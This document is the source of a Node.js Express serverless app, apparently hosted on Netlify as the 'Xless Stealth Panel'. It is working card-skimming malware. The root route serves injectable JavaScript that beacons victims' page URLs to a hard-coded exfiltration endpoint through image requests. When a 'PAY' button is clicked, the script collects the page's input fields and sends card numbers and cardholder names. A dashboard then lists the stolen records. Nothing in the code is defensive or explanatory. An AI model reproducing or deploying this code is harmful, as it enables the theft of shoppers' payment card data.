const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');

const app = express();
app.use(cors());
app.use(bodyParser.json());

let capturedData = [];

// استقبال البيانات عبر رابط الصورة (GET) لتجاوز الحماية
app.get('/api/exfiltrate', (req, res) => {
    const data = req.query; // البيانات ستأتي في الرابط
    data.time = new Date().toLocaleString();
    capturedData.unshift(data);
    // إرسال صورة شفافة صغيرة جداً للمتصفح لإيهامه بأن الطلب نجح
    const img = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {'Content-Type': 'image/gif', 'Content-Length': img.length});
    res.end(img);
});

app.get('/api/data', (req, res) => { res.json(capturedData); });

app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    var payload = "console.log('Xless Stealth Active');" +
        "var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate';" +
        "function send(d){ " +
        "  var img = new Image(); " +
        "  var params = new URLSearchParams(d).toString(); " +
        "  img.src = target + '?' + params; " + // إرسال البيانات كصورة
        "}" +
        "send({ type: 'STEALTH_HIT', url: location.href });" +
        "document.addEventListener('click', function(e){" +
        "  if(e.target.innerText && (e.target.innerText.includes('PAGARE') || e.target.innerText.includes('PAY'))){" +
        "    var ai = {}; document.querySelectorAll('input').forEach(i => { ai[i.name || i.id] = i.value; });" +
        "    send({ type: 'STEALTH_CAPTURE', card: ai['card_number'] || ai['number'], holder: ai['card_name'] || ai['holderName'] });" +
        "  }" +
        "});";
    res.send(payload);
});

app.get('/dashboard', (req, res) => {
    var html = "<html><head><title>Xless Panel</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px}table{width:100%;border-collapse:collapse;margin-top:20px}th,td{border:1px solid #333;padding:10px;text-align:left}th{background:#111}.val{color:#f0f;font-weight:bold}pre{margin:0;white-space:pre-wrap;}</style></head><body>" +
        "<h1>XLESS STEALTH PANEL</h1><button onclick='location.reload()'>REFRESH</button>" +
        "<table><thead><tr><th>Time</th><th>Type</th><th>Data</th></tr></thead><tbody id='b'></tbody></table>" +
        "<script>fetch('/api/data').then(r=>r.json()).then(data=>{ var h=''; data.forEach(d=>{ h+='<tr><td>'+d.time+'</td><td>'+(d.type||'HIT')+'</td><td class=\"val\"><pre>'+JSON.stringify(d,null,2)+'</pre></td></tr>'; }); document.getElementById('b').innerHTML=h||'<tr><td colspan=\"3\">Waiting...</td></tr>'; });</script></body></html>";
    res.send(html);
});

module.exports.handler = serverless(app);
